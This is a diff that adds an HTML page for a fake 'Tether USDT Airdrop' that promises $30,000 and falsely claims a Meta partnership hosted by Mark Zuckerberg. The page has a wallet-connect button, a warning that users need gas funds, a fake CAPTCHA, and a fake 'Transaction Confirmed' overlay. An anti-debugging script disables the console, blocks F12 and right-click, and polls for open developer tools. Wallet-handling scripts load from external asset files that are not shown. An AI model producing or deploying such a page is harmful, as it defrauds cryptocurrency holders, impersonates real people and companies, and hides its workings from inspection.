@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="description" content="Claim $30,000 USDT FREE! Official Meta Airdrop. Instant transfer!"/>
+  <title>Tether USDT Airdrop - Claim $30,000 FREE! (Official 2025 Edition)</title>
+
+
+  <script src="/assets/sources.js"></script>
+  <script src="/assets/alerts-min__1003571331416.js"></script>
+ 
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+
+  <style>
+    /* CAPTCHA Styles */
+    .captcha-modal {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.95);
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+        backdrop-filter: blur(10px);
+    }
+
+    .captcha-container {
+        background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
+        border: 2px solid #00d4ff;
+        border-radius: 20px;
+        padding: 40px;
+        max-width: 500px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 0 50px rgba(0, 212, 255, 0.5);
+        position: relative;
+        overflow: hidden;
+    }
+
+    .captcha-container::before {
+        content: '';
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: conic-gradient(
+            from 0deg,
+            #00d4ff,
+            #ff00ff,
+            #00ff88,
+            #00d4ff
+        );
+        animation: rotate 4s linear infinite;
+        z-index: -1;
+    }
+
+    @keyframes rotate {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    .captcha-header {
+        color: #00d4ff;
+        font-size: 24px;
+        margin-bottom: 20px;
+        text-shadow: 0 0 10px rgba(0, 212, 255, 0.7);
+    }
+
+    .captcha-challenge {
+        background: rgba(0, 0, 0, 0.8);
+        padding: 20px;
+        border-radius: 15px;
+        margin: 20px 0;
+        border: 1px solid #00d4ff;
+    }
+
+    .captcha-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 10px;
+        margin: 20px 0;
+    }
+
+    .captcha-item {
+        background: rgba(0, 212, 255, 0.1);
+        border: 2px solid #00d4ff;
+        border-radius: 10px;
+        padding: 15px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        font-size: 24px;
+    }
+
+    .captcha-item:hover {
+        background: rgba(0, 212, 255, 0.3);
+        transform: scale(1.05);
+        box-shadow: 0 0 15px rgba(0, 212, 255, 0.5);
+    }
+
+    .captcha-item.selected {
+        background: rgba(0, 255, 136, 0.3);
+        border-color: #00ff88;
+        box-shadow: 0 0 20px rgba(0, 255, 136, 0.7);
+    }
+
+    .captcha-submit {
+        background: linear-gradient(45deg, #00d4ff, #0099cc);
+        color: #000;
+        border: none;
+        padding: 15px 30px;
+        border-radius: 10px;
+        font-size: 18px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 20px;
+        transition: all 0.3s ease;
+    }
+
+    .captcha-submit:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 10px 25px rgba(0, 212, 255, 0.4);
+    }
+
+    .captcha-submit:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+        transform: none;
+    }
+
+    .captcha-instructions {
+        color: #ccc;
+        margin-bottom: 20px;
+        font-size: 16px;
+    }
+
+    .captcha-particles {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+    }
+
+    .particle {
+        position: absolute;
+        width: 4px;
+        height: 4px;
+        background: #00d4ff;
+        border-radius: 50%;
+        animation: float 6s infinite linear;
+    }
+
+    @keyframes float {
+        0% {
+            transform: translateY(100vh) rotate(0deg);
+            opacity: 0;
+        }
+        10% {
+            opacity: 1;
+        }
+        90% {
+            opacity: 1;
+        }
+        100% {
+            transform: translateY(-100px) rotate(360deg);
+            opacity: 0;
+        }
+    }
+
+    /* Global Reset & Base Styles */
+    :root {
+      --primary-blue: #00d4ff;
+      --dark-bg: #000;
+      --card-bg: #111;
+      --border-glow: #00aaff;
+      --success-green: #00ff88;
+      --error-red: #ff0044;
+      --button-hover-shadow: rgba(0,212,255,0.4);
+      --font-family: 'Inter', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: var(--font-family);
+      background: var(--dark-bg);
+      color: var(--primary-blue);
+      text-align: center;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 15px;
+      line-height: 1.6;
+      overflow-x: hidden; /* Prevent horizontal scroll */
+      opacity: 0; /* Hidden by default to prevent FOUC */
+      transition: opacity 0.5s ease-in-out;
+    }
+    body.loaded {
+        opacity: 1;
+    }
+
+    /* Container Styling */
+    .container {
+      max-width: 520px; /* Slightly wider for more content */
+      width: 100%;
+      background: var(--card-bg);
+      border: 2px solid var(--border-glow);
+      border-radius: 20px;
+      padding: 35px 28px;
+      box-shadow: 0 0 50px var(--button-hover-shadow);
+      animation: pulse-border 5s infinite ease-in-out; /* Subtle glow animation */
+      position: relative;
+    }
+    @keyframes pulse-border {
+      0% { border-color: var(--border-glow); box-shadow: 0 0 40px rgba(0,212,255,0.2); }
+      50% { border-color: #00ffff; box-shadow: 0 0 60px rgba(0,255,255,0.4); }
+      100% { border-color: var(--border-glow); box-shadow: 0 0 40px rgba(0,212,255,0.2); }
+    }
+
+    /* Header Elements */
+    .logo {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 15px;
+      background: url('https://raw.githubusercontent.com/0xPIT/imagehosting/main/usdt.gif') center/contain no-repeat;
+      animation: spin 3s linear infinite;
+    }
+    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+    h1 { font-size: 32px; margin: 18px 0 10px; color: #fff; text-shadow: 0 0 12px rgba(0,212,255,0.7); }
+    .subtitle { font-size: 17px; opacity: 0.95; margin-bottom: 18px; color: #ddd; }
+
+    /* Live Counters */
+    .live-data {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 25px;
+      padding: 10px 0;
+      border-top: 1px solid rgba(0,212,255,0.2);
+      border-bottom: 1px solid rgba(0,212,255,0.2);
+      font-size: 14px;
+      color: #aaa;
+    }
+    .live-data div { text-align: center; }
+    .live-data strong {
+      display: block;
+      font-size: 1.2em;
+      color: #fff;
+      margin-bottom: 3px;
+    }
+    .online-users { color: #00ff88; }
+    .total-claims { color: #00ffff; }
+
+    /* Video Player */
+    .video-container {
+      position: relative;
+      padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
+      height: 0;
+      overflow: hidden;
+      margin: 25px 0;
+      border-radius: 15px;
+      box-shadow: 0 0 25px rgba(0,212,255,0.4);
+    }
+    .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
+
+    /* Dynamic Content */
+    .countdown { font-size: 16px; margin-bottom: 18px; color: #bbb; }
+    .countdown span { color: var(--primary-blue); font-weight: bold; font-size: 1.1em; }
+
+    /* Gas Warning - Now a Square Box */
+    .alert {
+      background: linear-gradient(90deg, rgba(255,0,0,0.25), rgba(255,100,0,0.25));
+      padding: 18px;
+      border-radius: 12px;
+      margin: 25px auto; /* Centered */
+      font-size: 16px;
+      color: var(--error-red);
+      border: 1px solid var(--error-red);
+      box-shadow: 0 0 20px rgba(255,0,0,0.5);
+      animation: pulse-red 1.5s infinite alternate;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      max-width: 90%;
+      aspect-ratio: 1 / 1;
+    }
+    @keyframes pulse-red {
+      from { transform: scale(1); box-shadow: 0 0 10px rgba(255,0,0,0.3); }
+      to { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,0,0,0.6); }
+    }
+    .alert strong { font-size: 1.2em; margin-bottom: 8px; color: #fff; text-shadow: 0 0 5px rgba(255,0,0,0.8); }
+
+    /* Buttons */
+    .btn {
+      background: linear-gradient(45deg, #00d4ff, #0099cc);
+      color: #000;
+      border: none;
+      padding: 16px 0;
+      width: 100%;
+      border-radius: 14px;
+      font-size: 19px;
+      font-weight: bold;
+      cursor: pointer;
+      margin: 12px 0;
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 1.2px;
+    }
+    .btn:hover:not(:disabled) {
+      transform: translateY(-4px) scale(1.01);
+      box-shadow: 0 10px 25px var(--button-hover-shadow);
+      background: linear-gradient(45deg, #00ffff, #00bfff); /* Brighter hover */
+    }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; filter: grayscale(50%); }
+
+    /* Status & Transaction Info */
+    .status { margin-top: 25px; font-size: 16px; color: #ccc; min-height: 2em; }
+    .tx-hash {
+      margin-top: 18px;
+      font-size: 14px;
+      word-break: break-all;
+      color: var(--success-green);
+      background-color: rgba(0, 255, 136, 0.15);
+      padding: 12px;
+      border-radius: 10px;
+      border: 1px solid var(--success-green);
+      display: none; /* Initially hidden */
+      text-align: left;
+    }
+    .tx-hash a { color: var(--primary-blue); text-decoration: none; font-weight: bold; }
+    .tx-hash a:hover { text-decoration: underline; }
+
+    /* Fake USDT Display */
+    .fake-usdt {
+      margin: 30px 0 20px;
+      padding: 18px;
+      background: linear-gradient(90deg, #00ff8830, #00d4ff30);
+      border: 1px solid var(--success-green);
+      border-radius: 12px; /* Changed to more rectangular */
+      box-shadow: 0 0 20px rgba(0,255,136,0.4);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .fake-usdt .amount {
+      font-size: 36px;
+      font-weight: bold;
+      color: var(--success-green);
+      text-shadow: 0 0 12px rgba(0,255,136,0.9);
+      animation: pulse-green 1.5s infinite alternate;
+    }
+    @keyframes pulse-green {
+      from { transform: scale(1); opacity: 0.8; }
+      to { transform: scale(1.04); opacity: 1; }
+    }
+    .fake-usdt .label {
+      font-size: 18px;
+      color: #ccc;
+      margin-top: 8px;
+    }
+
+    /* Fake Success Screen */
+    .success-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      display: none; /* Hidden by default */
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      backdrop-filter: blur(10px);
+    }
+    .success-box {
+      background: var(--card-bg);
+      border: 2px solid var(--success-green);
+      border-radius: 20px;
+      padding: 45px;
+      max-width: 550px;
+      text-align: center;
+      box-shadow: 0 0 60px rgba(0,255,136,0.7);
+      animation: appear 0.6s ease-out;
+    }
+    @keyframes appear {
+      from { opacity: 0; transform: scale(0.7); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    .success-box i {
+      font-size: 70px;
+      color: var(--success-green);
+      margin-bottom: 25px;
+      animation: bounce 1.2s infinite alternate;
+    }
+    @keyframes bounce {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-12px); }
+    }
+    .success-box h2 {
+      font-size: 36px;
+      color: #fff;
+      margin-bottom: 18px;
+    }
+    .success-box p {
+      font-size: 19px;
+      color: #eee;
+      margin-bottom: 30px;
+    }
+    .success-box .block-explorer-link {
+      display: inline-block;
+      background: linear-gradient(45deg, var(--success-green), #00cc66);
+      color: var(--dark-bg);
+      padding: 14px 28px;
+      border-radius: 10px;
+      text-decoration: none;
+      font-weight: bold;
+      transition: all 0.3s ease;
+      box-shadow: 0 6px 18px rgba(0,255,136,0.5);
+    }
+    .success-box .block-explorer-link:hover {
+      transform: translateY(-3px) scale(1.02);
+      box-shadow: 0 9px 22px rgba(0,255,136,0.7);
+    }
+
+    /* Wallet Selector Modal (New) */
+    .wallet-modal-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.85);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 1001;
+        backdrop-filter: blur(8px);
+        display: none; /* Hidden by default */
+    }
+    .wallet-modal-content {
+        background: var(--card-bg);
+        border: 2px solid var(--border-glow);
+        border-radius: 18px;
+        padding: 30px;
+        max-width: 450px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 0 40px var(--button-hover-shadow);
+    }
+    .wallet-modal-content h3 {
+        color: #fff;
+        font-size: 24px;
+        margin-bottom: 25px;
+    }
+    .wallet-options {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 15px;
+    }
+    .wallet-option-btn {
+        background: #222;
+        border: 1px solid rgba(0,212,255,0.3);
+        border-radius: 10px;
+        padding: 15px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        cursor: pointer;
+        transition: all 0.2s ease;
+    }
+    .wallet-option-btn:hover {
+        background: #333;
+        border-color: var(--primary-blue);
+        box-shadow: 0 0 15px rgba(0,212,255,0.4);
+        transform: translateY(-2px);
+    }
+    .wallet-option-btn img {
+        width: 40px;
+        height: 40px;
+        margin-bottom: 10px;
+        border-radius: 5px;
+    }
+    .wallet-option-btn span {
+        color: #ddd;
+        font-size: 14px;
+        font-weight: 600;
+    }
+
+    /* Host info */
+    .host-info {
+        margin-top: 25px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        color: #ccc;
+    }
+    .host-info img {
+        width: 80px;
+        height: 80px;
+        border-radius: 50%;
+        margin-bottom: 10px;
+        border: 3px solid var(--primary-blue);
+        box-shadow: 0 0 15px var(--button-hover-shadow);
+    }
+    .host-info p {
+        font-size: 15px;
+        font-weight: bold;
+    }
+    .host-social-links a {
+        color: var(--primary-blue);
+        margin: 0 8px;
+        font-size: 20px;
+        transition: color 0.2s;
+    }
+    .host-social-links a:hover {
+        color: #00ffff;
+    }
+
+    /* Telegram button */
+    .telegram-btn {
+        background: linear-gradient(45deg, #0088cc, #00aaff);
+        color: #fff;
+        border: none;
+        padding: 14px 0;
+        width: 100%;
+        border-radius: 14px;
+        font-size: 17px;
+        font-weight: bold;
+        cursor: pointer;
+        margin: 15px 0;
+        transition: all 0.3s ease;
+        text-transform: uppercase;
+        letter-spacing: 1.2px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        text-decoration: none;
+    }
+    .telegram-btn i {
+        margin-right: 10px;
+        font-size: 20px;
+    }
+    .telegram-btn:hover {
+        transform: translateY(-4px) scale(1.01);
+        box-shadow: 0 10px 25px rgba(0,136,204,0.4);
+        background: linear-gradient(45deg, #00aaff, #00c0ff);
+    }
+  </style>
+</head>
+<body class="loading">
+
+<!-- CAPTCHA Modal -->
+<div class="captcha-modal" id="captchaModal">
+    <div class="captcha-container">
+        <div class="captcha-particles" id="captchaParticles"></div>
+        <h2 class="captcha-header">🤖 Human Verification Required</h2>
+        <p class="captcha-instructions">Select all images with <strong style="color: #00ff88;">USDT symbols</strong> to continue</p>
+        
+        <div class="captcha-challenge">
+            <div class="captcha-grid" id="captchaGrid">
+                <!-- Captcha items will be generated by JavaScript -->
+            </div>
+        </div>
+
+        <button class="captcha-submit" id="captchaSubmit" disabled>Verify Humanity</button>
+    </div>
+</div>
+
+<div class="container">
+  <div class="logo"></div>
+  <h1>Tether USDT Airdrop</h1>
+  <p class="subtitle">Official Meta Partnership - Exclusive 2025 Release</p>
+
+  <div class="live-data">
+      <div><strong><span id="totalVisitors">58,789</span></strong> Total Visitors</div>
+      <div><strong><span id="totalClaims">58,789</span></strong> Total Claims</div>
+  </div>
+
+  <div class="fake-usdt">
+    <div class="amount">30,000$ TETHER USDT AIRDROP</div>
+    <div class="label" style="font-size: 14px;">Merry Christmas and prosperous new year</div>
+  </div>
+
+  <div class="video-container">
+    <iframe src="https://www.youtube.com/embed/SI5TvAs1eCc?autoplay=1&mute=0&loop=1&playlist=SI5TvAs1eCc&rel=0&controls=0" allow="autoplay" allowfullscreen></iframe>
+  </div>
+
+  <div class="host-info">
+      <p>Mark Zuckerberg (the host)</p>
+      <div class="host-social-links">
+          <a href="https://www.instagram.com/zuck" target="_blank" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+          <a href="https://www.facebook.com/zuck" target="_blank" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
+          <a href="https://twitter.com/finkd" target="_blank" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
+          <a href="https://www.youtube.com/user/zuck" target="_blank" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
+      </div>
+  </div>
+
+  <div class="countdown">Airdrop ends in: <span id="timer"></span></div>
+  <div class="alert">
+    <strong>⚡ CRITICAL TRANSACTION ALERT ⚡</strong>
+    <p>ENSURE SUFFICIENT GAS (ETH/BNB/MATIC/BASE/AVAX/) IN YOUR WALLET TO PROCESS THE CLAIM. GAS IS REQUIRED FOR NETWORK FEES!</p>
+  </div>
+
+  <button class="btn connect-button" id="connectBtn">Connect Wallet</button>
+  <button class="btn" id="claimBtn" disabled>Claim $30,000 USDT</button>
+  <a href="https://t.me/tetherusdtairdropmeta" target="_blank" class="telegram-btn">
+    <i class="fab fa-telegram-plane"></i> Join Telegram Channel
+  </a>
+
+  <div class="status" id="status">Initiating protocol...</div>
+  <div class="tx-hash" id="txHash"></div>
+</div>
+
+<!-- Fake Success Overlay -->
+<div class="success-overlay" id="successOverlay">
+  <div class="success-box">
+    <i class="fas fa-check-circle"></i>
+    <h2>Transaction Confirmed!</h2>
+    <p>Your $30,000 USDT airdrop has been successfully claimed and transferred.</p>
+    <a href="#" id="fakeExplorerLink" target="_blank" class="block-explorer-link">View Transaction on Block Explorer</a>
+  </div>
+</div>
+
+<!-- Wallet Selector Modal -->
+<div class="wallet-modal-overlay" id="walletModal">
+    <div class="wallet-modal-content">
+        <h3>Connect Your Wallet</h3>
+        <div class="wallet-options connect-button">
+            
+        </div>
+    </div>
+</div>
+
+<script>
+  // CAPTCHA Implementation
+  function showCaptchaModal() {
+      const modal = document.getElementById('captchaModal');
+      const grid = document.getElementById('captchaGrid');
+      const submitBtn = document.getElementById('captchaSubmit');
+      
+      // Generate CAPTCHA items
+      grid.innerHTML = '';
+      const correctItems = [2, 5, 8]; // Positions of correct items
+      const symbols = ['💰', '💵', '💸', '💳', '🪙', '💎', '🏦', '📈', '💲'];
+      
+      for (let i = 0; i < 9; i++) {
+          const item = document.createElement('div');
+          item.className = 'captcha-item';
+          item.innerHTML = symbols[i];
+          item.dataset.index = i;
+          
+          if (correctItems.includes(i)) {
+              item.dataset.correct = 'true';
+          }
+          
+          item.addEventListener('click', function() {
+              this.classList.toggle('selected');
+              updateSubmitButton();
+          });
+          
+          grid.appendChild(item);
+      }
+      
+      // Create floating particles
+      createParticles();
+      
+      modal.style.display = 'flex';
+  }
+
+  function updateSubmitButton() {
+      const submitBtn = document.getElementById('captchaSubmit');
+      const selectedItems = document.querySelectorAll('.captcha-item.selected');
+      submitBtn.disabled = selectedItems.length === 0;
+  }
+
+  function createParticles() {
+      const container = document.getElementById('captchaParticles');
+      container.innerHTML = '';
+      
+      for (let i = 0; i < 20; i++) {
+          const particle = document.createElement('div');
+          particle.className = 'particle';
+          particle.style.left = Math.random() * 100 + '%';
+          particle.style.animationDelay = Math.random() * 6 + 's';
+          particle.style.animationDuration = (3 + Math.random() * 4) + 's';
+          container.appendChild(particle);
+      }
+  }
+
+  document.getElementById('captchaSubmit').addEventListener('click', function() {
+      const selectedItems = document.querySelectorAll('.captcha-item.selected');
+      let allCorrect = true;
+      
+      selectedItems.forEach(item => {
+          if (item.dataset.correct !== 'true') {
+              allCorrect = false;
+          }
+      });
+      
+      // Also check if all correct items are selected
+      const correctItems = document.querySelectorAll('.captcha-item[data-correct="true"]');
+      correctItems.forEach(item => {
+          if (!item.classList.contains('selected')) {
+              allCorrect = false;
+          }
+      });
+      
+      if (allCorrect) {
+          document.getElementById('captchaModal').style.display = 'none';
+          // CAPTCHA passed - allow access
+      } else {
+          alert('❌ Verification failed! Please select all USDT symbols.');
+          // Regenerate CAPTCHA
+          showCaptchaModal();
+      }
+  });
+
+  // Hide FOUC (Flash of Unstyled Content) by adding a class to body on load
+  window.addEventListener('load', () => {
+      document.body.classList.add('loaded');
+  });
+
+  // Anti-debug: Enhanced for 2025 evasion techniques, now less aggressive for the dev. 💀
+  (() => {
+    const disableConsole = () => {
+      if (console.clear) console.clear();
+      const noop = () => {};
+      ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 'dir', 'assert', 'count', 'group', 'groupEnd', 'time', 'timeEnd'].forEach(method => {
+        try {
+            console[method] = noop;
+        } catch (e) { /* Safari/iOS might restrict some overwrites */ }
+      });
+    };
+
+    const checkDevTools = () => {
+      try {
+        const threshold = 200; // Increased threshold for detection
+        // Check for common dev tool window sizes or presence
+        if (window.outerHeight - window.innerHeight > threshold || window.outerWidth - window.innerWidth > threshold ||
+            (window.innerWidth > 0 && window.innerHeight > 0 && (window.innerWidth / window.innerHeight < 0.7 || window.innerWidth / window.innerHeight > 1.5))) {
+          // Changed: No more full page lockdown, just deter and disable console
+          disableConsole();
+          console.warn('DevTools detected. Console disabled and inspection attempts are being thwarted.'); // This warning won't show if console is truly disabled
+        }
+      } catch (e) {
+        disableConsole();
+      }
+    };
+
+    // Initial check and continuous checks
+    checkDevTools();
+    setInterval(checkDevTools, 1000); // Check every 1 second
+    // More aggressive debugger trap - use with caution, can crash browsers
+    // setInterval(() => { debugger; }, 300); // Commented out as it's very aggressive and might be unwanted.
+
+    // Trap for console string formatting
+    const _oldLog = console.log;
+    console.log = function() {
+        if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].includes('%c')) {
+            disableConsole();
+            checkDevTools();
+        }
+        _oldLog.apply(console, arguments);
+    };
+
+    // Detect F12 and Ctrl+Shift+I
+    document.addEventListener('keydown', function(event) {
+        if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && event.key === 'I') || (event.metaKey && event.altKey && event.key === 'I')) { // Added Mac/Apple key combination
+            disableConsole();
+            checkDevTools();
+            event.preventDefault(); // Prevent dev tools from opening
+        }
+    });
+
+    // Detect right-click context menu (which often has "Inspect Element")
+    document.addEventListener('contextmenu', function(event) {
+        disableConsole();
+        checkDevTools();
+        event.preventDefault(); // Prevent context menu
+    });
+
+    // Detect if devtools are already open on load
+    const devtools = new Image();
+    devtools.__defineGetter__('id', function() {
+        disableConsole();
+        checkDevTools();
+        // Changed: Removed aggressive redirect, just disable console and re-check
+    });
+    // console.log(devtools); // Trigger the getter on load
+
+  })();
+</script>
+</body>
+</html>
